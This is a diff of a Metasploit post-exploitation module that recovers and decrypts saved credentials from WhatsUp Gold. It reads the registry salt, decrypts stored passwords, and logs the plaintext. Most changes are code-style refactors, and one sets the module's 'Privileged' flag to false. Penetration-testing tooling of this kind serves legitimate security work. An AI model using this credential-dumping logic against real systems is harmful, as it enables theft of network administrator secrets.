@@ -26,7 +26,6 @@ class MetasploitModule < Msf::Post
           credentials are automatically added to loot.
         },
         'Author' => [
-
           'sshah[at]assetnote.io', # original research
           'npm[at]cesium137.io' # additional research and module
         ],
@@ -71,7 +70,7 @@ class MetasploitModule < Msf::Post
           'Reliability' => [ REPEATABLE_SESSION ],
           'SideEffects' => [ IOC_IN_LOGS ]
         },
-        'Privileged' => true
+        'Privileged' => false
       )
     )
     register_advanced_options([
@@ -95,9 +94,7 @@ class MetasploitModule < Msf::Post
   end
 
   def x64?
-    return true if sysinfo['Architecture'] == ARCH_X64
-
-    false
+    sysinfo['Architecture'] == ARCH_X64
   end
 
   def run
@@ -209,7 +206,7 @@ class MetasploitModule < Msf::Post
         vprint_warning("nCredentialTypeID #{credential_id} Password column nil, excluding")
         blank_rows += 1
         next
-      elsif secret_ciphertext.start_with?('1,0,0,0,') || secret_ciphertext.start_with?('2,0,0,0,') || secret_ciphertext.start_with?('3,0,0,0,')
+      elsif [ '1,0,0,0,', '2,0,0,0,', '3,0,0,0,' ].any? { |prefix| secret_ciphertext.start_with?(prefix) }
         plaintext = wug_decrypt(secret_ciphertext)
         secret_plaintext = plaintext['Plaintext'] if plaintext.key?('Plaintext')
         secret_disposition = plaintext['Method'] if plaintext.key?('Method')
@@ -219,12 +216,12 @@ class MetasploitModule < Msf::Post
         secret_disposition = 'Plaintext'
         plaintext_rows += 1
       end
-      if secret_plaintext.nil? || secret_plaintext.empty?
+      if secret_plaintext.blank?
         vprint_warning("nCredentialTypeID #{credential_id} field '#{secret_username}' decrypted plaintext nil, excluding")
         blank_rows += 1
         next
       end
-      if !secret_plaintext
+      unless secret_plaintext
         print_error("nCredentialTypeID #{credential_id} field '#{secret_username}' failed to decrypt")
         vprint_error(row.to_s)
         failed_rows += 1
@@ -235,6 +232,7 @@ class MetasploitModule < Msf::Post
       result_csv << result_row
       vprint_status("nCredentialTypeID #{credential_id} field '#{secret_username}' plaintext recovered: #{secret_plaintext} (#{secret_disposition})")
     end
+
     {
       processed_rows: current_row,
       blank_rows: blank_rows,
@@ -511,17 +509,15 @@ class MetasploitModule < Msf::Post
 
   def wug_get_salt_value
     vprint_status('Get WhatsUp Gold dynamic salt from registry ...')
-    if x64?
-      reg_key = 'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Gold'
-    else
-      reg_key = 'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Gold'
-    end
-    if !registry_key_exist?(reg_key)
+    reg_key = (x64? ? 'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Gold' : 'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Gold')
+
+    unless registry_key_exist?(reg_key)
       vprint_warning('Could not locate WhatsUp Gold registry key')
       return nil
     end
+
     salt_str = registry_getvaldata(reg_key, 'SerialNumber').to_s.delete("\000")
-    if salt_str.nil? || salt_str.empty?
+    if salt_str.blank?
       vprint_warning('Could not read SerialNumber from registry')
       return nil
     end
